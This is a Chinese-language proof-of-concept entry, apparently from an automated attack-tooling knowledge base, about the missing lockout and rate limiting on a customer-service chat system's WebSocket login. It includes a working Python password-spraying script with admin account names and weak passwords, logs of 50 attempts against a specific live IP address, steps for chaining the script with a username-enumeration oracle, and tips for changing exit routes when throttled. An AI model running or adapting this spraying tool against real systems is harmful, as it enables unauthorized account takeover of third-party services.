# 夜好推客服系统 /ws/chat WS login 无失败锁定与无速率限制（可对已知账号无约束口令喷洒）

- **code**: yehaotui-ws-chat-login-no-lockout-no-ratelimit
- **kind**: poc
- **category**: weak-password
- **component**: 夜好推客服系统（WebSocket /ws/chat 聊天服务）
- **severity**: low
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 task#1 实测于 82.156.110.36:9800（Windows 跳板机，经环境 HTTP_PROXY 隧道直连，脚本 /opt/artex/data/tasks/1/i27/kprobe.py brute 模式）。对 ws://82.156.110.36:9800/ws/chat 每次新连接发 {"type":"login","username":U,"password":P}，共 50 次失败（10 个账号 admin/administrator/manager/kefu/客服/operator/root/boss/agent/system × 5 口令 123456/admin/admin123/12345678/password），brute.log 全 50 行为 [no] ... {"success":false,"message":"用户名或密码错误"}，无一条出现锁定/封禁/验证码/剩余尝试次数提示；第 50 次仍返回同一错误，同一账号连打 5 次后行为不变。故判定该 login 端点无失败计数/锁定/速率限制。
- **path**: pocs/yehaotui-ws-chat-login-no-lockout-no-ratelimit/poc.py
- **tags**: websocket, ws, login, brute-force, no-lockout, no-ratelimit, 口令喷洒, 客服系统, weak-password, 夜好推, rfc6455
- **created_at**: 2026-11-11T12:50:53.038Z
- **engine**: http://82.156.110.36:9800/chat （WS: ws://82.156.110.36:9800/ws/chat）

## 描述

夜好推客服系统聊天服务挂在 WebSocket /ws/chat 上，其登录消息在未认证状态下即可反复尝试：对错误口令只回同一句「用户名或密码错误」，既不累加失败次数、也不锁定账号、无限速/无验证码，跨账号累计 50 次失败仍无任何节流迹象。前提：无需认证，每次尝试都必须用全新 WS 连接（登录后的连接会进入会话态、阻断同连接上后续 auth 消息）。配合 register 用户名枚举 oracle（见 kb#507）先拿到真实存在的账号清单后，即可对已知账号做无约束的在线口令喷洒。属于 low 的信息类/机制缺陷，本身不直接给权限，但显著降低弱口令爆破的成本与噪声代价。

## 用法

```
前置：目标前端形如 http://<IP>:9800/chat，WS 入口 /ws/chat；只需一次 WS upgrade 握手，无需凭据。关键约束——每次 login 必须重开 WS 连接（用全新连接发一次就关），否则同连接上后续 auth 消息无回显。

步骤：
  1) 先跑 register 枚举（kb#507）拿真实账号清单，避免对不存在账号空打；
  2) 对候选账号逐个 login 探测，判定只看返回 JSON 的 success 字段：
       {"action":"login","message":"用户名或密码错误","success":false,"type":"auth"}  → 口令错，继续
       success=true（通常带 token）                                                    → 命中，取 token
  3) 限幅建议（本目标实测无锁定，但仍是有效的低噪声做法）：每账号 ≤5 口令、独立连接、失败间 sleep ≥1.5s。

复现命令（脚本 i27/kprobe.py，依赖同会话/同目录 ws.py 最小 RFC6455 客户端）：
  python kprobe.py brute     # 10 账号 × 5 弱口令，逐条打印 [HIT]/[no] + 回显
  python kprobe.py correct   # 打印「注册成功 + 正确口令登录」的成功回显形状，做判据对照
  # 改目标：把 ws.py 顶部 HOST/PORT/PATH 换成你的目标（默认 82.156.110.36:9800 /ws/chat）
  # 出口：脚本自动读 HTTP_PROXY/ALL_PROXY，用 HTTP CONNECT 隧道；直连可用时置空 PROXY。

判据（证明「无失败锁定/无限速」的对照实验）：
  · 同一账号连续 5 次错误口令后，第 6 次（换账号）行为不变，第 50 次仍返回同一句错误 → 失败计数未落地；
  · 全程无 429 / 连接重置 / 账号锁定 / 验证码 /「还剩 N 次」提示 → 无限速、无临时封禁。

失败/误判常见原因：
  1) 复用 WS 连接 → 第二次及以后 auth 消息无任何回显，会误判为「被锁定」；必须每次重开连接。
  2) 握手未成功（返回头非 HTTP/1.1 101）→ 后续帧全部无响应；先确认 do_handshake 返回头是 101。
  3) login 侧无用户名枚举差异（有效/不存在用户都回同一条错误），枚举只能靠 register，别在此处误判。
  4) 目标对高频 auth 有节流风险，脚本内 sleep 1.5s 是实测可用的保守值；若真出现 429/重置，降速或换出口。
```

## 正文

```
# 夜好推客服系统 /ws/chat —— WS login 无失败锁定 / 无速率限制

目标形态: http://<IP>:9800/chat  →  WS: ws://<IP>:9800/ws/chat
无需认证，一次 WS upgrade 握手即可反复尝试登录。

## 结论

- 错误口令只回同一句 {"action":"login","message":"用户名或密码错误","success":false,"type":"auth"}
- 单一账号连续 5 次失败：不锁定、不累加
- 跨 10 个账号累计 50 次失败：无 429 / 无连接重置 / 无临时封禁 / 无验证码 / 无「还剩 N 次」提示
- 第 50 次仍返回同一错误 → 失败计数未落地，可对已知账号无约束地持续喷洒口令

## 关键约束

每次 login/register 都必须使用**全新 WS 连接**：登录成功后的连接进入会话态，会阻断同连接上后续的 auth 消息。

## 复现脚本（brute 模式，i27/kprobe.py）

```python
#!/usr/bin/env python3
# 夜好推 WS 凭据面验证：用户名枚举 + 管理类账号弱口令严格限幅
# 每次 login/register 用全新 WS 连接（登录后会话态会阻断同连接后续 auth）
import json, sys, time, os
sys.path.insert(0, "<ws.py 所在目录>")
from ws import connect, do_handshake, send_frame, recv_frame

def drain(s, sec):
    end = time.time()+sec; msgs=[]
    while time.time() < end:
        try: f = recv_frame(s, timeout=max(0.3, end-time.time()))
        except Exception: break
        if f is None: break
        op, data = f
        if op == 9: send_frame(s, data, opcode=10); continue
        if op == 8: break
        if op in (1,2): msgs.append(data.decode(errors="replace"))
    return msgs

def one(msg, sec=4):
    s = connect(); do_handshake(s); time.sleep(0.3); drain(s,1.0)
    send_frame(s, json.dumps({"type":"connect"})); drain(s,1.2)
    send_frame(s, json.dumps(msg))
    got = drain(s, sec)
    s.close()
    out=""
    for g in got:
        try:
            j=json.loads(g)
            if j.get("type")=="auth": return j
        except Exception:
            pass
        out=g
    return {"raw": out}

def login(u,p): return one({"type":"login","username":u,"password":p})
def reg(u,p,n="x"): return one({"type":"register","username":u,"password":p,"nickname":n})

if __name__=="__main__":
    mode = sys.argv[1]
    if mode=="brute":
        # 每账号 <=5 口令，独立连接，失败间 sleep
        accounts = ["admin","administrator","manager","kefu","客服","operator","root","boss","agent","system"]
        pws = ["123456","admin","admin123","12345678","password"]
        for a in accounts:
            for i,p in enumerate(pws):
                try:
                    r = login(a,p)
                except Exception as e:
                    print("[ERR]",a,p,e); break
                ok = r.get("success")
                print("[%s] %s/%s -> %s" % ("HIT" if ok else "no", a, p, json.dumps(r,ensure_ascii=False)[:220]))
                if ok:
                    print("*** HIT token:", r.get("token"))
                    break
                time.sleep(1.5)
```

（ws.py 为最小 RFC6455 客户端，无外部依赖、支持 HTTP 代理 CONNECT；完整实现见 kb#507 的 poc。）

## 实测回显（2026-11-11, 82.156.110.36:9800，共 50 次失败）

```
[no] admin/123456         -> {"action": "login", "message": "用户名或密码错误", "success": false, "type": "auth"}
[no] admin/admin          -> {"action": "login", "message": "用户名或密码错误", "success": false, "type": "auth"}
...
[no] system/12345678      -> {"action": "login", "message": "用户名或密码错误", "success": false, "type": "auth"}
[no] system/password      -> {"action": "login", "message": "用户名或密码错误", "success": false, "type": "auth"}
```

50 行全部为 [no] + 同一句「用户名或密码错误」，无一条出现锁定/封禁/验证码/剩余尝试次数提示。

## 后续用法

先用 register 用户名枚举 oracle（kb#507）把 admin / administrator / manager / kefu / 客服 / operator / root / boss / agent / system 等常见管理类名过一遍，拿到真实存在的账号清单后，
对这些账号做「严格限幅」的口令验证（每账号 <=5 口令、独立连接、间隔 >=1.5s）。
本条目证明的是：即便放开限幅，目标也不会锁定/节流——即口令喷洒的成本只由你自己的字典与并发决定。

```
